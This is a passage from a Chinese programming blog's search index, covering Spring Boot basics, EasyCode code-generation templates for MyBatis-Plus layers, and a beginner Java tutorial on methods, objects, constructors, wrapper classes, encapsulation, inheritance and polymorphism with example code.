开发。不仅继承了Spring框架原有的优秀特性，它并不是用来替代 Spring 的解决方案，而和 Spring 框架紧密 结合进一步简化了Spring应用的整个搭建和开发过程。其设计目的是用来简化 Spring 应用的初始搭建以及开发过程怎么简化的呢？就是 通过提供默认配置等方式让我们更容易使用。 参考资料SpringBoot 2.X 简介及搭建简介SpringBoot它基于Spring4.0设计，是由 Pivotal 公司提供的框架。 2014 年 4 月发布 Spring Boot 1.0 基于Spring4.0 2018 年 3 月 Spring Boot 2.0发布 基于Spring 5.0。 SpringBoot基于Spring开发。不仅继承了Spring框架原有的优秀特性，它并不是用来替代 Spring 的解决方案，而和 Spring 框架紧密 结合进一步简化了Spring应用的整个搭建和开发过程。其设计目的是用来简化 Spring应用的初始搭建以及开发过程怎么简化的呢？就是 通过提供默认配置等方式让我们更容易使用。 关于 SpringBoot 有一句很出名的话就是约定大于配置。采用 Spring Boot 可以大大的简化开发模式，它集成了大量常用的第三方库配 置，所有你想集成的常用框架，它都有对应的组件支持，例如 Redis、MongoDB、Dubbo、kafka，ES等等。SpringBoot 应用中这些第 三方库几乎可以零配置地开箱即用，大部分的 SpringBoot 应用都只需要非常少量的配置代码，开发者能够更加专注于业务逻辑。另外 SpringBoot通过集成大量的框架使得依赖包的版本冲突，以及引用的不稳定性等问题得到了很好的解决。 简化Spring应用开发的一个框架；对整个企业级开发技术栈的一个大整合build anything；J2EE开发的一站式解决方案； 配置文件和自动配置原理热部署与日志SwaggerEasyCode 点击显/隐代码块(entity.java.vm) ##导入宏定义 $!{define.vm} ##保存文件（宏定义） #save(\"/entity\", \".java\") ##包路径（宏定义） #setPackageSuffix(\"entity\") ##自动导入包（全局变量） $!{autoImport.vm} import java.io.Serializable; import java.util.Date; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import com.baomidou.mybatisplus.annotation.TableName; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; /** * @author ada * @ClassName ${tableInfo.name} * @Description $!{tableInfo.comment}实体类 * @Computer Macbook pro * @Date $!time.currTime() * @JDKVersion JDK1.8 */ @Data @AllArgsConstructor @NoArgsConstructor @TableName(\"$!{tableInfo.obj.name}\") @ApiModel(value=\"$!{tableInfo.name}对象\", description=\"$!{tableInfo.comment}\") public class $!{tableInfo.name} implements Serializable { private static final long serialVersionUID = $!tool.serial(); #foreach($column in $tableInfo.fullColumn) #if(${column.comment}) // ${column.comment} #end #if(${column.comment})@ApiModelProperty(value = \"${column.comment}\")#end #if($column.name.equals('id'))@TableId(type = IdType.AUTO)#end private $!{tool.getClsNameByFullName($column.type)} $!{column.name}; #end } 点击显/隐代码块(mapper.java.vm) ##导入宏定义 $!{define.vm} ##设置表后缀（宏定义） #setTableSuffix(\"Mapper\") ##保存文件（宏定义） #save(\"/mapper\", \"Mapper.java\") ##包路径（宏定义） #setPackageSuffix(\"mapper\") import com.baomidou.mybatisplus.core.mapper.BaseMapper; import org.springframework.stereotype.Component; import $!{tableInfo.savePackageName}.entity.$!{tableInfo.name}; /** * @author ada * @ClassName ${tableInfo.name} * @Description $!{tableInfo.comment}表数据库访问层 * @Computer Macbook pro * @Date $!time.currTime() * @JDKVersion JDK1.8 */ @Component public interface $!{tableName} extends BaseMapper&lt;$!{tableInfo.name}&gt; { } 点击显/隐代码块(mapper.xml.vm) ##引入mybatis支持 $!{mybatisSupport.vm} ##设置保存名称与保存位置 $!callback.setFileName($tool.append($!{tableInfo.name}, \"Mapper.xml\")) $!callback.setSavePath($tool.append($modulePath, \"/src/main/resources/mapper\")) ##拿到主键 #if(!$tableInfo.pkColumn.isEmpty()) #set($pk = $tableInfo.pkColumn.get(0)) #end &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"$!{tableInfo.savePackageName}.mapper.$!{tableInfo.name}Mapper\"&gt; &lt;resultMap type=\"$!{tableInfo.savePackageName}.entity.$!{tableInfo.name}\" id=\"$!{tableInfo.name}Map\"&gt; #foreach($column in $tableInfo.fullColumn) &lt;result property=\"$!column.name\" column=\"$!column.obj.name\" jdbcType=\"$!column.ext.jdbcType\"/&gt; #end &lt;/resultMap&gt; &lt;!-- 批量插入 --&gt; &lt;insert id=\"insertBatch\" keyProperty=\"$!pk.name\" useGeneratedKeys=\"true\"&gt; insert into $!{tableInfo.obj.parent.name}.$!{tableInfo.obj.name}(#foreach($column in $tableInfo.otherColumn)$!column.obj.name#if($velocityHasNext), #end#end) values &lt;foreach collection=\"entities\" item=\"entity\" separator=\",\"&gt; (#foreach($column in $tableInfo.otherColumn)#{entity.$!{column.name}}#if($velocityHasNext), #end#end) &lt;/foreach&gt; &lt;/insert&gt; &lt;!-- 批量插入或按主键更新 --&gt; &lt;insert id=\"insertOrUpdateBatch\" keyProperty=\"$!pk.name\" useGeneratedKeys=\"true\"&gt; insert into $!{tableInfo.obj.parent.name}.$!{tableInfo.obj.name}(#foreach($column in $tableInfo.otherColumn)$!column.obj.name#if($velocityHasNext), #end#end) values &lt;foreach collection=\"entities\" item=\"entity\" separator=\",\"&gt; (#foreach($column in $tableInfo.otherColumn)#{entity.$!{column.name}}#if($velocityHasNext), #end#end) &lt;/foreach&gt; on duplicate key update #foreach($column in $tableInfo.otherColumn)$!column.obj.name = values($!column.obj.name) #if($velocityHasNext), #end#end &lt;/insert&gt; &lt;/mapper&gt; 点击显/隐代码块(service.java.vm) ##导入宏定义 $!{define.vm} ##设置表后缀（宏定义） #setTableSuffix(\"Service\") ##保存文件（宏定义） #save(\"/service\", \"Service.java\") ##包路径（宏定义） #setPackageSuffix(\"service\") import com.baomidou.mybatisplus.extension.service.IService; import $!{tableInfo.savePackageName}.entity.$!tableInfo.name; /** * @author ada * @ClassName ${tableInfo.name} * @Description $!{tableInfo.comment}服务接口 * @Computer Macbook pro * @Date $!time.currTime() * @JDKVersion JDK1.8 */ public interface $!{tableName} extends IService&lt;$!tableInfo.name&gt; { } 点击显/隐代码块(serviceImpl.java.xml) ##导入宏定义 $!{define.vm} ##设置表后缀（宏定义） #setTableSuffix(\"ServiceImpl\") ##保存文件（宏定义） #save(\"/service/impl\", \"ServiceImpl.java\") ##包路径（宏定义） #setPackageSuffix(\"service.impl\") import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl; import $!{tableInfo.savePackageName}.mapper.$!{tableInfo.name}Mapper; import $!{tableInfo.savePackageName}.entity.$!{tableInfo.name}; import $!{tableInfo.savePackageName}.service.$!{tableInfo.name}Service; import org.springframework.stereotype.Service; /** * @author ada * @ClassName ${tableInfo.name} * @Description $!{tableInfo.comment}服务实现类 * @Computer Macbook pro * @Date $!time.currTime() * @JDKVersion JDK1.8 */ @Service(\"$!tool.firstLowerCase($tableInfo.name)ServiceImpl\") public class $!{tableName} extends ServiceImpl&lt;$!{tableInfo.name}Mapper, $!{tableInfo.name}&gt; implements $!{tableInfo.name}Service { } 点击显/隐代码块(controller.java.vm) ##导入宏定义 $!{define.vm} ##设置表后缀（宏定义） #setTableSuffix(\"Controller\") ##保存文件（宏定义） #save(\"/controller\", \"Controller.java\") ##包路径（宏定义） #setPackageSuffix(\"controller\") ##定义服务名 #set($serviceName = $!tool.append($!tool.firstLowerCase($!tableInfo.name), \"Service\")) ##定义实体对象名 #set($entityName = $!tool.firstLowerCase($!tableInfo.name)) import $!{tableInfo.savePackageName}.service.impl.$!{tableInfo.name}ServiceImpl; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import io.swagger.annotations.Api; /** * @author ada * @ClassName ${tableInfo.name} * @Description $!{tableInfo.comment}实体类 * @Computer Macbook pro * @Date $!time.currTime() * @JDKVersion JDK1.8 */ @RestController @Slf4j @RequestMapping(\"/$!tool.firstLowerCase($!tableInfo.name)\") @Api(tags = \"$!{tableInfo.comment}\") public class $!{tableName} { //服务对象 @Autowired private $!{tableInfo.name}ServiceImpl service; } 快速搭建 调用顺序：遵循Controller–Service接口–ServiceImpt实现类–Mapper接口模式; 那么在Service接口有多个ServiceImpt实现类的情况，就需要指定参数名来选择哪个ServiceImpt实现类了。 只有一个实现类，Controller层用@Autowired 注入 Service接口，如果有多个实现类在实现类中用@Service定义实现类名， Controller层用 @Resource(name=”PCIimpt2”) 指定 都用 注入都注入 Service接口，有多个就用@Resource指定名称 只有一个就不指定 多态 Service层（此时有两个接口实现类） @Service(\"PCIImpt1\") class PCIImpt1 imeplements PCI{} @Service(\"PCIimpt2\") class PCIImpt2 imeplements PCI{} Controller层 @Resource(name=\"PCIimpt2\") //填PCIimpt1，注入PCIimpt1实现类，填PCIimpt2，则注入PCIimpt2实现类 private PCI pci; //注入接口以Resource手动指定接收","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://www.adalucky.com/tags/springboot/"}],"author":"Ada"},{"title":"Java 基础语法 Pro","slug":"Auto/Java初级Pro","date":"2021-12-15T16:13:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/java-chu-ji-pro/","link":"","permalink":"https://www.adalucky.com/auto/java-chu-ji-pro/","excerpt":"Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、动态性等特点 Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等","text":"Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、动态性等特点 Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等 参考资料IDEA Mac快捷键 函数简介 函数的概念 函数就是定义在类中的具有特定功能的一段独立小程序 函数也成为方法 通俗的说：函数（方法）是一段可重复调用的代码段 函数分类 普通方法：静态（static）、类方法和实例（对象）方法 构造函数 其它说明： 传参 有参数，则必须传入参数 传参类型要一致 传参个数也要一致，没有则不需要传参 返回值 用关键字return来返回 返回值 void 的方法默认是有一个 return 返回至调用处，一般不写 如果有返回值，return的值要与定义的返回值类型一致 可变参数 可变参数是 jdk1.5 的新特性 public static 返回值类型 方法名称(数据类型… 参数名称) 会把传入的数据类型组成一个数组 类方法点击显/隐代码块 package com.tester.ada.function; /** * @author ada * @ClassName FunctionTester * @Description 类方法 * @Computer Macbook pro * @Date 2021/12/15 23:41 */ public class FunctionTester { public static void main(String[] args) { getDayInfo(1); System.out.println(\"调用返回值:\"+getDayInfo(1)); } /** * private 修饰符 * static 静态方法、类方法，如果没有就是对象方法就需要 new 对象去调用 * String 声明没有返回值（如果有返回值就用 void，定义返回值类型 return 返回） * getDayInfo 方法名，遵循小驼峰、动宾短语、动词命名规范 * (int day) 形参(形参类型 形参名，形参类型2 形参名2)，如果不需要参数可不定义形参，括号必须要有 */ private static String getDayInfo(int day) { switch (day) { case 1: case 2: case 3: case 4: case 5: System.out.println(\"今天是工作日\"); break; case 6: case 7: System.out.println(\"今天是周末\"); break; default: System.out.println(\"非法的数值\"); } return \"调用成功\"; } } 对象方法点击显/隐代码块 package com.tester.ada.function; /** * @author ada * @ClassName FunctionTester2 * @Description 对象方法 * @Computer Macbook pro * @Date 2021/12/15 23:57 */ public class FunctionTester2 { public static void main(String[] args) { // new 对象 FunctionTester2 tester = new FunctionTester2(); int aInt = 3; double aDouble = 10; // 对象调用对象方法 System.out.println(tester.sum(aInt,aDouble)); System.out.println(tester.sum(8,12.75)); } // 定义带有两个参数类型的对象方法 private double sum(int aInt,double aDouble) { return aInt + aDouble; // 返回没有定义的匿名变量值为 aInt + aDouble } } 点击显/隐代码块 package com.tester.ada.function; /** * @author ada * @ClassName FunctionTester3 * @Description 形参和可变参数 * @Computer Macbook pro * @Date 2021/12/16 21:40 */ public class FunctionTester3 { public static void main(String[] args) { int[] ints = {1, 2, 3, 4}; FunctionTester3 functionTester3 = new FunctionTester3(); System.out.println(functionTester3.plus(ints)); System.out.println(functionTester3.sum(ints)); functionTester3.say(\"h\",\"e\",\"ll\",\"o\"); } /** * for 循环 * * @param ints * @return */ private int plus(int[] ints) { int sum = 0; for (int i = 0; i &lt; ints.length; i++) { sum += ints[i]; } return sum; } /** * foreach * * @param ints * @return */ private int sum(int[] ints) { int sum1 = 0; for (int aInt : ints ) { sum1 += aInt; } return sum1; } /** * 可变参数 * @param aStr */ private void say(String... aStr) { String aString = null; for (String aStr1 : aStr) { System.out.print(aStr1); } } } 面向对象简介 Java 是面向对象的语言，在 Java 中，一切皆为对象 每一个人都是一个对象 属性：姓名、性别、年龄、身高、星座 行为：吃饭、睡觉、学习、打豆豆 类与对象 类：共性事务的抽象，是对某一具有共性事物的描述，是概念上的定义 对象：对象是共性事务的一个个体现，是这个类事务的一个个体或者说是类的一个实例(instance) 一个对象是数据和相关方法的集合，数据是对象的状态，方法是对象的行为 面向对象概念构成了 Java 的核心 面向对象具有封装 继承 多态 三大特性 解释：人、手机、水果、苹果是一个类，具体的某个人比如你 比如我是一个具体对象 你的手机 我的手机是一个具体的对象 水果是一个更大的类包含了苹果类可以当成它的父类 总结：① 类是抽象的、很泛的一个概念，对象是某一具体的的事物 ② 类是对象的模板，对象是类的实例 场景：小明 坐着 D553高铁 去拉萨 类：人类、火车类、地理位置类 对象：小明、D553高铁、拉萨 方法、行为：坐着、去 类的创建和实例化创建类 类的组成：属性+方法 语法声明 修饰符 class 类名称{ // 定义属性 修饰符 数据类型 属性; //声明成员变量（属性） .... // 定义函数 可变参数可用 参数类型... 表示 public 返回值数据类型 方法名称(参数类型 参数名,参数类型 参数名2){ // TODO 程序语句 return 表达式; //返回值 void 可不写 } } 点击显/隐代码块(创建类) package com.tester.ada.target; /** * @author ada * @ClassName MemberTester * @Description 会员类 * @Computer Macbook pro * @Date 2021/12/16 23:08 */ public class MemberTester { // 一个 P2P 的项目有借款人、有投资人、每个人共有的属性和行为 // 一、数据：共性的数据--&gt;属性（成员变量） 每个会员都有的属性 手机号、密码、用户名、余额 String phone; String pwd; String regName; String amount; // 二、行为：对象的方法、实例方法(不加 static ) 注册、登录、重置、提现 public String register(String phone, String pwd, String regName) { if (11 == phone.length() &amp;&amp; 6 == pwd.length() &amp;&amp; 8 &gt;= regName.length()) { return \"注册成功\"; } else { return \"用户信息错误\"; } } public String login(String phone, String pwd) { if (11 == phone.length() &amp;&amp; 6 == pwd.length()) { return \"Login success\"; } else { return \"Login failed\"; } } } 对象实例化 语法声明 // 语法一 类名称 对象名称 = new 类名称(); // 语法二 类名称 对象名称 = null; //声明对象 对象名称 = new 类名称(); //实例化对象 //有了对象后就可以去设置属性或者调用方法了 访问属性：对象名称.属性名; 为属性赋值：对象名称.属性名 = 值; 访问方法：对象名称.方法名(); 点击显/隐代码块(实例化) package com.tester.ada.target; /** * @author ada * @ClassName MemberExampleTester * @Description MemberTester的实例 * @Computer Macbook pro * @Date 2021/12/16 23:24 */ public class MemberExampleTester { public static void main(String[] args) { // 用户 ada 的手机号是 13555555555 密码是 123456 昵称是 阿达 现在他想要要注册 // 类名 对象名 = new 类名(); MemberTester ada = new MemberTester(); // 设置对象属性 ada.phone = \"13555555555\"; ada.pwd = \"123456\"; ada.regName = \"阿达\"; System.out.println(ada.register(ada.phone, ada.pwd, ada.regName)); } } 构造函数概念 构造函数是用构造对象的函数 示例：User user = new User(); 构造方法必须与类名一致 使用 new 关键字进行调用 在每个类中都存在一个默认的无参构造方法，默认不显示 分类 构造函数分为两类：带参和无参的构造函数 无参构造函数（默认构造函数） // 语法示例 public 类名称(){ ... } 带参数构造函数 public 类名称(参数类型 参数名,参数类型 参数名){ ... } 其它说明： 构造函数无返回值，返回的是一个具体的对象 参数类型为 8 大基本数据类型、引用类型 可以重写默认的构造函数（但是这种应该用处不大，一般都是自己重新定义一个带参数的构造函数） 写带参数的构造函数的目的是为了方便创建对象 初始化对象 如果显示的写了构造函数后，还想调用无参的构造函数，就必须显示声明一个无参构造函数 注意事项 调用构造函数语法 类名 对象名 = new 类名(); 无参构造函数（默认带有一个，如果写了有参的必须显示声明后才能使用，否则找不到） 类名 对象名 = new 类名(value1,value2); 有参的构造函数 其它注意事项 调用带参构造函数创建对象，可以按照我们的意愿来初始化对象的属性（方便我们初始化对象） 调用无参构造函数：对象属性值对应类型默认值 默认构造函数是自带的(如果没有声明，则编码器会自动补齐) 如果定义了带参构造函数，会覆盖无参构造函数，此时如果需要调用无参构造函数，则必须显示定义无参构造函数 创建 this 表示当前对象，也就调用的对象 如果构造函数中不用 this.phone = phone; 而是采用 phone = phone; 由于就近原则两个 phone 都是使用的形参的这样就不起作用，除非把形参的变量名和属性名设置成不同的，不过一般不这样用，每次都要去起两个变量名，阅读性也不高 构造函数中的参数可以添加非属性的其它参数 点击显/隐代码块(生成构造函数) package com.tester.ada.target; /** * @author ada * @ClassName MemberTester * @Description 会员类 * @Computer Macbook pro * @Date 2021/12/16 23:08 */ public class MemberTester { // 一个 P2P 的项目有借款人、有投资人、每个人共有的属性和行为 // 一、数据：共性的数据--&gt;属性（成员变量） 每个会员都有的属性 手机号、密码、用户名、余额 String phone; String pwd; String regName; String amount; // public MemberTester(String phone, String pwd, String regName, String amount) { // super(); //Object类先创建出来 构造时会先调用父类的构造函数,这里的 super 可以不写 this.phone = phone; this.pwd = pwd; this.regName = regName; this.amount = amount; } // 应为显示声明了带参数的构造函数还想使用无参的就必须要显示声明 public MemberTester() { } // 二、行为：对象的方法、实例方法(不加 static ) 注册、登录、重置、提现 public String register(String phone, String pwd, String regName) { if (11 == phone.length() &amp;&amp; 6 == pwd.length() &amp;&amp; 8 &gt;= regName.length()) { return \"注册成功\"; } else { return \"用户信息错误\"; } } public String login(String phone, String pwd) { if (11 == phone.length() &amp;&amp; 6 == pwd.length()) { return \"Login success\"; } else { return \"Login failed\"; } } } 调用点击显/隐代码块(调用带参构造函数) package com.tester.ada.target; /** * @author ada * @ClassName MemberExampleTester * @Description MemberTester的实例 * @Computer Macbook pro * @Date 2021/12/16 23:24 */ public class MemberExampleTester { public static void main(String[] args) { // 用户 ada 的手机号是 13555555555 密码是 123456 昵称是 阿达 现在他想要要注册 // 类名 对象名 = new 类名(); MemberTester ada = new MemberTester(); // 设置对象属性 ada.phone = \"13555555555\"; ada.pwd = \"123456\"; ada.regName = \"阿达\"; System.out.println(ada.register(ada.phone, ada.pwd, ada.regName)); // 构造函数初始化及调用对象方法 MemberTester link = new MemberTester(\"13888888888\", \"666666\", \"link\", \"8000\"); System.out.println(link.register(link.phone, link.pwd, link.regName)); } } 内存分配分配过程 声明对象：Person per = null; 声明对象时会把 per 对象存在占内存中 实例化对象：per = new Person(); 会给 per 对象开辟一段队内存空间（给对象赋的属性值就会在这块堆内存中，此时还没给对象的属性进行赋值，那么这些属性值都是类型对应的缺省值 如 String–&gt;null int–&gt;0 ） 关联：栈内存中的 per 对象会保存一个地址指向堆内存地址的引用 如 0x1354464548 存放分类 栈内存 基本类型变量（基本数据类型 四类八种） 对象引用，应用类型名称（比如上面的 per），即队堆的引用地址 堆内存 new 创建的对象和数组 属性 全局数据区（静态区） static 属性 全局代码区 方法 字符串池(常量池) jdk1.7 前在方法区，1.7 后再堆中间 共享的 String 对象 内存地址点击显/隐代码块(内存分配) package com.tester.ada.target; /** * @author ada * @ClassName MemoryTester * @Description 内存分配(堆栈) * @Computer Macbook pro * @Date 2021/12/18 00:02 */ public class MemoryTester { public static void main(String[] args) { String str1 = \"hello\"; //在字符串池（常量池）中创建了一个字面值为 hello String str2 = \"hello\"; //字符串池（常量池）中 已经有一个字面值为 hello 的了，那么直接用 str2 指向这个地址 String str3 = new String(\"hello\"); // new 给 str3 分配一块栈内存执行一个堆内存地址 0x156164646 String str4 = new String(\"hello\"); // new 给 str4 分配另一块栈内存执行一个堆内存地址 0x6484684 System.out.println(str1 == str2); //结果为 true 应为 str1 和 str2 指向的是同一个常量池中的地址 System.out.println(str2 == str3); //结果为 false 指向的不同地址，只能说字面值相等， == 比较的是内存地址 System.out.println(str3 == str4); //结果为 false 指向的不同地址（如果地址相同肯定值也相同了） System.out.println(\"---------------重新分配地址---------------\"); str3 = str1; //把 str1 的地址分配给 str3 str4 = str2; //把 str2 的地址分配给 str4 System.out.println(str3 == str4); //因为 str2 也是指向 str1 的地址所以 str3 和 str4 最终都是指向的 str1 的地址，因此为 true System.out.println(\"---------------此时 str3 和 str4 的内存没有人引用了会成为垃圾内存，会被 gc 回收---------------\"); } } 包装类简介 数据类型分类：基本数据类型和引用数据类型 矛盾：基本数据类型不是类(类都是大写)，因此 Java 为了调和矛盾引入了包装类 解决矛盾：8 个基本数据类型对应 8 个包装类 类型 基本数据类型 包装类 整型 byte Byte ~ short Short ~ int Interger ~ long Long 浮点型 float Float ~ double Double 字符型 char Character 布尔型 boolean Boolean 包装类：以类的形式来管理基本数据类型 如 Integer 使用类的形式表示整数 Integer i = new Integer(20); 示例点击显/隐代码块[包装类] package com.tester.ada.packages; /** * @author ada * @ClassName PackageClassTester * @Description 包装类 * @Computer Macbook pro * @Date 2021/12/18 13:25 */ public class PackageClassTester { public static void main(String[] args) { // 整型--&gt;Integer--&gt;描述整型数据类型的类 System.out.println(Integer.MAX_VALUE); System.out.println(Integer.MIN_VALUE); // 包装类语法 Integer aInteger = new Integer(10); System.out.println(aInteger); // 装箱（基本数据类型变成包装类） Integer Integer = new Integer(20); //手动装箱 Double aDouble = new Double(20.5); // 自动装箱（直接把一个 int 类型的数值用 Integer 包装类接收） 自动装箱 自动拆箱是 jdk1.5 后提供的新特性 Integer Integer2 = 30; // 拆箱（包装类变成基本数据类型） int aInt = Integer.intValue(); //手动拆箱，调用 数据类型Value() 方法 double adouble = aDouble.doubleValue(); System.out.println(aInt); System.out.println(adouble); // 自动拆箱 Integer 是上面手动装箱的变量，然后用对应的基本类型接收 int bInt = Integer; } } 包装类常用方法xxxValue() 以基本数据类型返回指定的数值—&gt;(拆箱) int j = i.intValue(); 获得最大最小值 获得最大值：Integer.MAX_VALUE 获得最小值：Integer.MIN_VALUE 将字符串转换为基本数据类型 如果字符串不是数字格式会出现格式异常 String str = \"10086\"; int i = Integer.parseInt(str); double d = Double。parseDouble(str); String str2 = String.parseString(i); 转换示例一点击显/隐代码块 package com.tester.ada.conversion; /** * @author ada * @ClassName TypeConversionTester * @Description 类型转换 * @Computer Macbook pro * @Date 2021/12/19 23:37 */ public class TypeConversionTester { public static void main(String[] args) { int i = 10; double doubleValue = 20; double d = i; //低位到高位自动转换，测试经理是测试从业人员 int j = (int) doubleValue; //高位到低位强制转换，测试从业人员不一定是测试经理 System.out.println(\"d的值为：\" + d + \"，j的值为：\" + j); } } 示例二点击显/隐代码块(会员类) package com.tester.ada.conversion; /** * @author ada * @ClassName MemberTester * @Description 会员类 * @Computer Macbook pro * @Date 2021/12/19 23:53 */ public class MemberTester { InvestTester tom = new InvestTester(); BorrowerTester jack = new BorrowerTester(); MemberTester tom1 = tom; // 投资人自动向上转型为会员类 MemberTester jack1 = jack; //借款人自动向上转型为会员类 MemberTester link = new MemberTester(); MemberTester ada = new MemberTester(); InvestTester link1 = (InvestTester) link; //大类型强制转换为小类型 BorrowerTester ada1 = (BorrowerTester) ada; //大类型强制转换为小类型 InvestTester tom3 = new InvestTester(); BorrowerTester tom4 = (BorrowerTester) tom3; // 无法将投资人转换为借款人 } 点击显/隐代码块(投资人) package com.tester.ada.conversion; /** * @author ada * @ClassName InvestTester * @Description 投资人也是会员，继承会员类 * @Computer Macbook pro * @Date 2021/12/19 23:53 */ public class InvestTester extends MemberTester { } 点击显/隐代码块(借款人) package com.tester.ada.conversion; /** * @author ada * @ClassName BorrowerTester * @Description 借款人也是会员，继承会员类 * @Computer Macbook pro * @Date 2021/12/19 23:55 */ public class BorrowerTester extends MemberTester{ } Java 三大特性封装概念 封装是 Java 三大特性之一，把对象的内部细节封闭起来，只提供操作对象属性的公共方法（把属性设置为 private，然后提供公共公开的 set get 方法） 封装是面向对象编程语言对客观世界的模拟 例如，电视机它的内部元件就是被封闭起来了，仅仅暴露电视机按钮供人们使用，这样就没有人能任意更改咱们的元件 Java 里面通过将属性设置成私有的，对属性都使用暴露出来的公共接口去操作，这样数据才更安全，更好维护 目的 通过公开方法访问数据，可以从方法里加入逻辑控制，避免不合理的访问，可进行数据检查，保证数据完整性，防止不希望的交互和非法的访问便于后期修改，提高代码的可维护性 实现 属性私有化：隐藏对象的属性和实现细节，不允许外部直接访问（设置为 private，这样就不能通过 对象.属性名 调用） 提供公开的方法操作和访问属性（set get） get set 只针对属性，如果不需要进行逻辑处理可引入 lombok 后在类名前添加 @Data 注解隐式声明，针对与需要做逻辑处理的显示声明，编写逻辑处理代码 boolean 类型的属性生成的 get set 方法中 set 会变为 is pom.xml引入 lombok 依赖后，在类名前添加 @Data 注解 &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 示例点击显/隐代码块(lombok依赖) &lt;!-- 依赖 --&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 点击显/隐代码块(设置公共公开方法) package com.tester.ada.trait.encapsulation; import lombok.Data; /** * @author ada * @ClassName MemberTester * @Description 封装 * @Computer Macbook pro * @Date 2021/12/20 22:37 */ @Data public class MemberTester { private String phone; private String password; public void setPhone(String phone) { if (11 == phone.length()) this.phone = phone; } } 点击显/隐代码块(调用公共公开方法) package com.tester.ada.trait.encapsulation; /** * @author ada * @ClassName BorrowerTester * @Description 调用公共公开方法 * @Computer Macbook pro * @Date 2021/12/20 22:42 */ public class BorrowerTester extends MemberTester { public static void main(String[] args) { BorrowerTester link = new BorrowerTester(); link.setPhone(\"13888888888\"); System.out.println(link.getPhone()); } } 继承简介 继承是 Java 三大特性的另一大特性，继承是从已有的类中派生出新的类，新的类能吸收已有类的属性和行为，并能扩展新的能力 一个类 A 继承 B 可以通过 extends 来实现（extends 翻译为扩展，我们通俗的称为继承） 一个不由任何类派生出来的类称为基类（派生类） ，一个派生类（子类）最近的上层类称为该类的父类，从某一个派生类出来的类称为该类的子类 派生类（子类）与父类之间是一个子与父的关系，子跟父之间的关系是 is a 的关系，父类和子类是 has a 的关系 水果类 –&gt;热带水果、亚热带水果 –&gt;芒果、香蕉、火龙果（热带水果） 芒果 extends 热带水果 –&gt; 子类 extends 父类 –&gt; 子类 is a 父类 –&gt; 芒果 is a 热带水果 = 热带水果 has a 芒果 Java 中子类不能获得父类的构造方法 语法修饰符 class SubClass extends SuperClass{ //类定义 } 示例点击显/隐代码块(会员类父类) package com.tester.ada.trait.inherit; import lombok.Data; /** * @author ada * @ClassName MemberTester * @Description 会员类（父类） * @Computer Macbook pro * @Date 2021/12/20 23:38 */ @Data public class MemberTester { private String phone; private String pwd; private String regName; private double amount; } 点击显/隐代码块(借款人子类) package com.tester.ada.trait.inherit; import lombok.Data; /** * @author ada * @ClassName BorrowerTester * @Description 借款人继承会员类（子类） * @Computer Macbook pro * @Date 2021/12/20 23:37 */ @Data public class BorrowerTester extends MemberTester{ // 子类继承父类，但是子类有自己的一些属性 比如借款人需要关注你是否有车 是否有房 private boolean hasCar; private boolean hasHouse; } 点击显/隐代码块(投资人子类) package com.tester.ada.trait.inherit; import lombok.Data; /** * @author ada * @ClassName InvestTester * @Description 投资人继承会员类（子类） * @Computer Macbook pro * @Date 2021/12/20 23:38 */ @Data public class InvestTester extends MemberTester{ // 只有投资人才会去投资，因此要单独给它写一个方法，子类自己扩展的方法 public void invest(double doubleValue){ System.out.println(\"调用：InvestTester.invest()\"+\"投资【\"+doubleValue+\"】元成功\"); } } 点击显/隐代码块(测试) package com.tester.ada.trait.inherit; /** * @author ada * @ClassName Tester1 * @Description 测试 * @Computer Macbook pro * @Date 2021/12/21 00:31 */ public class Tester1 { public static void main(String[] args) { InvestTester ada = new InvestTester(); ada.setAmount(10000); System.out.println(ada.getAmount()); // set get方法来自于父类 ada.invest(3000); //调用子类扩展的方法 BorrowerTester dream = new BorrowerTester(); dream.setPhone(\"13555555555\"); //调用父类的 set 方法 dream.setHasCar(true); // 调用子类扩展的方法 System.out.println(dream.getPhone()); System.out.println(dream.isHasCar()); } } 多态概念 不同的对象对应相同的方法表现出不同的特征和响应：如对于自行车和汽车他们都定义了刹车的方法，但是它们的刹车方式却完全不同，又比如动物类都有吃东西的方法，食肉动物吃东西的方法是吃肉食，食草动物吃东西的方法是吃草 蔬菜，乐器都会发出声音，不同乐器演奏出来的表现形式各不相同 用父类类型来接受子类的对象，Java 通过方法重写来实现多态 通过方法重写，子类可以实现父类的某些方法，使其具有自己的特征 (例如都是人类，别人实现一个小目标是一个亿，我们的一个小目标是换个手机，因此要重写“富人”和“穷人”实现目标的方法，使其具有自己的特征) 通过方法重写 相同的对象（变量），执行同一个方法表现出不同的行为特征，就称为多态 多态的优点：提高代码的复用性，简化代码 缘由 在很对时候会使用父类类型接受子类对象，但是父类类型又没有实现该方法，会出现报错，如下图所示 当然可以直接在父类中实现该方法解决报错，不过很多时候子类有自己的实现方式，比如充值的方法，针对于投资人是充值投资，针对于借款人是充值还款，因此要在子类中实现自己的充值方法 示例点击显/隐代码块(会员类父类) package com.tester.ada.trait.Polymorphism; import lombok.Data; /** * @author ada * @ClassName MemberTester * @Description 多态 * @Computer Macbook pro * @Date 2021/12/21 01:44 */ @Data public class MemberTester { private String phone; private String pwd; private String regName; private double amount; 